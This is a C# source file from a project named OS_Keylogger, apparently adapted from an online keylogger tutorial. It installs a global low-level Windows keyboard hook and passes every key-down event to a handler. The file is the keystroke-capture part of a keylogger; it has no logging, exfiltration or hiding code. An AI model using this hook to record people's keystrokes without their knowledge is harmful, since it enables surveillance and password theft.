/*
 *  Keyhook.cs
 *  
 *  Based off code from http://www.axino.net/tutorial/2009/02/keylogger-in-c-introduction
 * 
 *  Modified by:
 *  Audie Sumaray
 *  Eric Hacecky
 *  
 *  12/3/11
 *  
 */

using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Diagnostics;
using System.Windows.Forms;
using System.Runtime.InteropServices;

namespace OS_Keylogger
{
    class Keyhook
    {
        public enum Key
        {
            VK_0 = 0X30,
            VK_1 = 0X31,
            VK_2 = 0X32,
            VK_3 = 0X33,
            VK_4 = 0X34,
            VK_5 = 0X35,
            VK_6 = 0X36,
            VK_7 = 0X37,
            VK_8 = 0X38,
            VK_9 = 0X39,

            VK_A = 0X41,
            VK_B = 0X42,
            VK_C = 0X43,
            VK_D = 0X44,
            VK_E = 0X45,
            VK_F = 0X46,
            VK_G = 0X47,
            VK_H = 0X48,
            VK_I = 0X49,
            VK_J = 0X4A,
            VK_K = 0X4B,
            VK_L = 0X4C,
            VK_M = 0X4D,
            VK_N = 0X4E,
            VK_O = 0X4F,
            VK_P = 0X50,
            VK_Q = 0X51,
            VK_R = 0X52,
            VK_S = 0X53,
            VK_T = 0X54,
            VK_U = 0X55,
            VK_V = 0X56,
            VK_W = 0X57,
            VK_X = 0X58,
            VK_Y = 0X59,
            VK_Z = 0X5A,

            VK_NUMPAD0 = 0X60,
            VK_NUMPAD1 = 0X61,
            VK_NUMPAD2 = 0X62,
            VK_NUMPAD3 = 0X63,
            VK_NUMPAD4 = 0X64,
            VK_NUMPAD5 = 0X65,
            VK_NUMPAD6 = 0X66,
            VK_NUMPAD7 = 0X67,
            VK_NUMPAD8 = 0X68,
            VK_NUMPAD9 = 0X69,

            VK_BACK = 0X08, // Backspace
            VK_TAB = 0X09, // Tab
            VK_RETURN = 0x0D,
            VK_SHIFT = 0x10,
            VK_CONTROL = 0x11,
            VK_MENU = 0x12, // alt
            VK_CAPITAL = 0x14, // caps lock
            VK_ESCAPE = 0x1B,
            VK_SPACE = 0x20,

            VK_UP = 0x26,
            VK_RIGHT = 0x27,
            VK_DOWN = 0x28,
            VK_LEFT = 0x25,
            VK_DELETE = 0x2E,
            VK_LWIN = 0x5B,
            VK_RWIN = 0x5C,
            VK_LSHIFT = 0xA0,
            VK_RSHIFT = 0xA1,
            VK_LCONTROL = 0xA2,
            VK_RCONTROL = 0xA3,
            VK_LMENU = 0xA4,
            VK_RMENU = 0xA5,

            VK_OEM_1 = 0xBA,
            VK_OEM_PLUS = 0xBB,
            VK_OEM_COMMA = 0xBC,
            VK_OEM_MINUS = 0xBD,
            VK_OEM_PERIOD = 0xBE,
            VK_OEM_2 = 0xBF,
            VK_OEM_3 = 0xC0,
            VK_OEM_4 = 0xD8,
            VK_OEM_5 = 0xDC,
            VK_OEM_6 = 0xDD,
            VK_OEM_7 = 0xDE,

            VK_F1 = 0X70,
            VK_F2 = 0X71,
            VK_F3 = 0X72,
            VK_F4 = 0X73,
            VK_F5 = 0X74,
            VK_F6 = 0X75,
            VK_F7 = 0X76,
            VK_F8 = 0X77,
            VK_F9 = 0X78,
            VK_F10 = 0X79,
            VK_F11 = 0X7A,
            VK_F12 = 0X7B,
        }

        public delegate IntPtr HookDel(
            int nCode,
            IntPtr wParam,
            IntPtr lParam);

        public delegate void KeyHandler(
            IntPtr wParam,
            IntPtr lParam);

        private static IntPtr hhk = IntPtr.Zero;
        private static HookDel hd;
        private static KeyHandler kh;

        //Creation of the hook
        public static void CreateHook(KeyHandler _kh)
        {
            Process _this = Process.GetCurrentProcess();
            ProcessModule mod = _this.MainModule;
            hd = HookFunc;
            kh = _kh;

            hhk = Keyhook.SetWindowsHookEx(13, hd, Keyhook.GetModuleHandle(mod.ModuleName), 0);
            //13 is the parameter specifying that we're gonna do a low-level keyboard hook

            //MessageBox.Show(Marshal.GetLastWin32Error().ToString()); //for debugging
            //Note that this could be a Console.WriteLine(), as well. I just happened
            //to be debugging this in a Windows Application
        }

        public static bool DestroyHook()
        {
            //to be called when we're done with the hook
            return Keyhook.UnhookWindowsHookEx(hhk);
        }

        //called when key is active
        private static IntPtr HookFunc(
            int nCode,
            IntPtr wParam,
            IntPtr lParam)
        {
            int iwParam = wParam.ToInt32();
            //depending on what you want to detect you can either detect keypressed or keyrealased also with  a bit tweaking keyclicked.
            if (nCode >= 0 &&
                (iwParam == 0x100 ||
                iwParam == 0x104)) //0x100 = WM_KEYDOWN, 0x104 = WM_SYSKEYDOWN
                kh(wParam, lParam);
 
            return Keyhook.CallNextHookEx(hhk, nCode, wParam, lParam);
        }

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        public static extern IntPtr SetWindowsHookEx(
            int idHook,
            HookDel lpfn,
            IntPtr hMod,
            uint dwThreadId);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        public static extern bool UnhookWindowsHookEx(
            IntPtr hhk);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        public static extern IntPtr CallNextHookEx(
            IntPtr hhk,
            int nCode,
            IntPtr
            wParam,
            IntPtr lParam);

        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        public static extern IntPtr GetModuleHandle(
            string lpModuleName);
    }
}
